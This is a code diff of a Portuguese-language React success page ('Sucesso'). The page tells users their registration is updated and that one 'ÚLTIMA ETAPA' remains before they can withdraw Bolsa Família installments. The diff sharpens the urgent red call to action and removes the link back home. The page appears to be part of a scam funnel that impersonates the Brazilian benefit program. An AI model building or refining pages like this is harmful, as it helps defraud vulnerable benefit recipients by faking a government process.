@@ -1,4 +1,4 @@
-import { CheckCircle, Home } from 'lucide-react';
+import { Check } from 'lucide-react';
 import { useLocation } from 'wouter';
 import { useUserStore } from '../store/userStore';
 
@@ -6,65 +6,46 @@ export default function Sucesso() {
   const [, navigate] = useLocation();
   const { userData } = useUserStore();
   
-  const handleVoltarHome = () => {
+  const handleContinuar = () => {
     navigate('/');
   };
 
-  return (
-    <div className="min-h-screen bg-white flex flex-col">
-      {/* Cabeçalho com gradiente azul */}
-      <div className="relative">
-        <header className="bg-gradient-to-r from-[#0066b3] to-[#03a9f4] text-white p-4 flex items-center justify-center">
-          <span className="text-lg font-medium">Atualização concluída</span>
-        </header>
-        {/* Barra inferior */}
-        <div className="h-1 bg-white w-full absolute bottom-0 opacity-20"></div>
-      </div>
+  // Obter apenas o primeiro nome
+  const primeiroNome = userData.nome.split(' ')[0];
 
-      <div className="flex-1 p-6 flex flex-col items-center justify-center">
-        <div className="text-center space-y-6 max-w-md mb-12">
-          {/* Ícone de sucesso */}
-          <div className="flex justify-center mb-4">
-            <CheckCircle size={80} className="text-green-500" />
-          </div>
-          
-          {/* Título */}
-          <h1 className="text-2xl font-bold text-[#0066b3]">
-            Atualização cadastral concluída!
-          </h1>
-          
-          {/* Mensagem */}
-          <p className="text-gray-600">
-            Olá, <strong>{userData.nome}</strong>! Seu cadastro foi atualizado com sucesso. 
-            As parcelas do Bolsa Família serão liberadas em breve.
-          </p>
-          
-          <div className="bg-[#fff2f2] p-4 rounded-lg border-l-4 border-[#ee8435]">
-            <p className="text-gray-700 font-medium">
-              <span className="font-bold">{userData.nome.split(' ')[0]}</span>, resta apenas uma <span className="font-bold text-red-600">ÚLTIMA ETAPA</span> para sacar suas <span className="font-bold text-red-600">PARCELAS DO BOLSA FAMÍLIA</span>!
-            </p>
+  return (
+    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6">
+      <div className="max-w-sm w-full p-6 text-center">
+        {/* Ícone de sucesso */}
+        <div className="flex justify-center mb-8">
+          <div className="w-24 h-24 text-green-500">
+            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="50" cy="50" r="45" stroke="currentColor" strokeWidth="8" />
+              <path d="M30 50L45 65L70 35" stroke="currentColor" strokeWidth="8" strokeLinecap="round" strokeLinejoin="round" />
+            </svg>
           </div>
         </div>
         
-        {/* Botão próxima etapa */}
+        {/* Título */}
+        <h1 className="text-2xl font-bold text-green-500 mb-8">
+          Cadastro atualizado com sucesso!
+        </h1>
+        
+        {/* Mensagem */}
+        <div className="bg-[#f1f9ff] p-4 rounded-lg mb-8">
+          <p className="text-gray-700">
+            <span className="font-medium">{primeiroNome}</span>, resta apenas uma <span className="font-bold text-red-600">ÚLTIMA ETAPA</span> para sacar suas <span className="font-bold text-red-600">PARCELAS DO BOLSA FAMÍLIA</span>!
+          </p>
+        </div>
+        
+        {/* Botão continuar */}
         <button
           type="button"
-          className="w-full py-4 bg-green-600 text-white font-medium rounded-md hover:bg-green-700 uppercase flex items-center justify-center"
-          onClick={handleVoltarHome}
+          className="w-full py-4 bg-[#ee8435] text-white font-medium rounded-md hover:bg-[#df7426] uppercase"
+          onClick={handleContinuar}
         >
-          <CheckCircle size={20} className="mr-2" />
-          Concluir última etapa
+          CONTINUAR
         </button>
-        
-        {/* Link para voltar */}
-        <div className="mt-4 text-center">
-          <button 
-            onClick={handleVoltarHome}
-            className="text-blue-600 font-medium hover:underline"
-          >
-            Voltar para a página inicial
-          </button>
-        </div>
       </div>
     </div>
   );
